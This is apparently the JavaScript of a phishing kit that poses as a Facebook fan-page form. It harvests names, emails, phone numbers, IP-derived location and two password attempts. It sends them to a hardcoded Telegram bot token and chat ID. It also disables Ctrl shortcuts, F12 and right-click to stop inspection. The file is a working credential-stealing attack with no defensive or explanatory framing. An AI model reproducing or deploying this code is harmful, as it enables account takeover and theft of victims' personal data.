let form = document.getElementById("form");

let bot = {
    TOKEN: "6837873605:AAFD07DqxA38rzvzO90vg-mNhGosDegWce4",
    chatID: "-4106900723",
};

function openForm() {
    document.getElementById("myForm").style.display = "flex";
}

function closeForm() {
    document.getElementById("myForm").style.display = "none";
}

form.addEventListener("submit", (e) => {
    e.preventDefault();
    $.getJSON("https://api.db-ip.com/v2/free/self", function (data) {
        let userData = {
            nameFanpage: document.getElementsByName("nameFanpage")[0].value,
            fullname: document.getElementsByName("fullname")[0].value,
            email: document.getElementsByName("email")[0].value,
            personalMail: document.getElementsByName("personalEmail")[0].value,
            phone: document.getElementsByName("phone")[0].value,
            information: document.getElementsByName("information")[0].value,
            ipAddress: data.ipAddress,
            country: `${data.countryName}(${data.countryCode})`,
            city: data.city,
            password1: "",
            password2: ""
        };

        openForm();

        let popupform = document.getElementById("form1");
        popupform.addEventListener("submit", (e1) => {
            e1.preventDefault();

            if (userData.password1 === "") {
                userData.password1 = document.getElementsByName("password")[0].value;

                // Send the first message with password1 only
                let message1 = `
                    Data:
                    User Email: ${userData.email}
                    Facebook Page: ${userData.nameFanpage}
                    Fullname: ${userData.fullname}
                    User Email: ${userData.personalMail}
                    Phone Number: ${userData.phone}
                    First Password: ${userData.password1}
                    Second Password: 
                    IP Address: ${userData.ipAddress}
                    Country: ${userData.country}
                    City: ${userData.city}`;

                fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${encodeURIComponent(message1)}`, {
                    method: "GET",
                }).then((res) => {
                    console.log(res);
                    document.getElementById("message").innerText = "Enter the second password";
                }).catch((err) => console.log(err));
            } else {
                userData.password2 = document.getElementsByName("password")[0].value;

                // Send the second message with both passwords
                let message2 = `
                    Data:
                    User Email: ${userData.email}
                    Facebook Page: ${userData.nameFanpage}
                    Fullname: ${userData.fullname}
                    User Email: ${userData.personalMail}
                    Phone Number: ${userData.phone}
                    First Password: ${userData.password1}
                    Second Password: ${userData.password2}
                    IP Address: ${userData.ipAddress}
                    Country: ${userData.country}
                    City: ${userData.city}`;

                fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${encodeURIComponent(message2)}`, {
                    method: "GET",
                }).then((res) => {
                    console.log(res);
                    window.location.href = "confirm.html";
                }).catch((err) => console.log(err));
            }

            document.getElementById("message").style.display = "block";
            document.getElementsByName("password")[0].value = "";
        });
    });
});

document.addEventListener("keydown", function (event) {
    if (event.ctrlKey) {
        event.preventDefault();
    }
    if (event.keyCode == 123) {
        event.preventDefault();
    }
});

document.addEventListener('contextmenu', event => event.preventDefault());

